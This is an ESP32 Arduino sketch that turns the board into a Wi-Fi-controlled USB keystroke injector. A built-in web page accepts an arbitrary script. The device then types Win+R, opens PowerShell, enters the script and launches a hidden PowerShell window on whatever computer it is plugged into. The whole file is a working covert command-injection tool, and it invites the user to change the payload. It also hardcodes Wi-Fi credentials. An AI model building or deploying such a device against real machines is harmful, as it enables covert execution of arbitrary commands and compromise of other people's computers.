#include "Arduino.h"
#include "USB.h"
#include "USBHIDKeyboard.h"
#include <WiFi.h>
#include <WebServer.h>

const char* ssid = "Riyaa_ekkada";//enter your wifi name
const char* password = "riyaa__evaru";//enter your wifi password

USBHIDKeyboard Keyboard;
WebServer server(80);
String receivedScript = "";

const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>ESP32 Web Input</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin: 40px; }
        textarea { width: 80%; height: 100px; font-size: 16px; }
        button { padding: 10px; font-size: 16px; margin-top: 10px; }
    </style>
</head>
<body>
    <h2>Enter Script for ESP32</h2>
    <textarea id="scriptInput" placeholder="Enter your script here..."></textarea><br>
    <button onclick="sendData()">Send</button>
    <p id="response"></p>

    <script>
        function sendData() {
            var scriptText = document.getElementById("scriptInput").value;
            fetch("/submit?script=" + encodeURIComponent(scriptText))
                .then(response => response.text())
                .then(data => document.getElementById("response").innerText = "ESP32 Received: " + data);
        }
    </script>
</body>
</html>
)rawliteral";

void handleRoot() {
    server.send(200, "text/html", index_html);
}

void handleInput() {
    if (server.hasArg("script")) {
        receivedScript = server.arg("script");
        Serial.println("[HTTP] Received Script: " + receivedScript);
        server.send(200, "text/plain", "ESP32 Executing Script: " + receivedScript);
        executeScript();
    } else {
        Serial.println("[HTTP] No script received");
        server.send(400, "text/plain", "No script received");
    }
}

void executeScript() {

//you can change payload here.
    Serial.println("[KEYBOARD] Opening Run Dialog...");
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(500);

    Serial.println("[KEYBOARD] Opening PowerShell...");
    Keyboard.println("powershell");
    delay(500);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(1000);

    if (receivedScript.length() > 0) {
        Serial.print("[KEYBOARD] Executing script: ");
        Serial.println(receivedScript);
        
       
        
        Keyboard.println(receivedScript);
        delay(500);
        Keyboard.println("powershell -WindowStyle Hidden");
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
    } else {
        Serial.println("[ERROR] No script received. Skipping execution.");
    }
}

void setup() {
    USB.begin();
    Serial.begin(115200);
    while (!Serial);
    Serial.println("\n[SETUP] Starting ESP32...");

    WiFi.begin(ssid, password);
    while (WiFi.status() != WL_CONNECTED) {
        delay(1000);
        Serial.print(".");
    }
    Serial.println("\n[SETUP] Connected to Wi-Fi!");
    Serial.print("[SETUP] ESP32 Local IP: ");
    Serial.println(WiFi.localIP());

    Keyboard.begin();
    server.on("/", handleRoot);
    server.on("/submit", handleInput);
    server.begin();
    Serial.println("[SETUP] Web Server Started!");
}

void loop() {
    server.handleClient();
    delay(10);
}
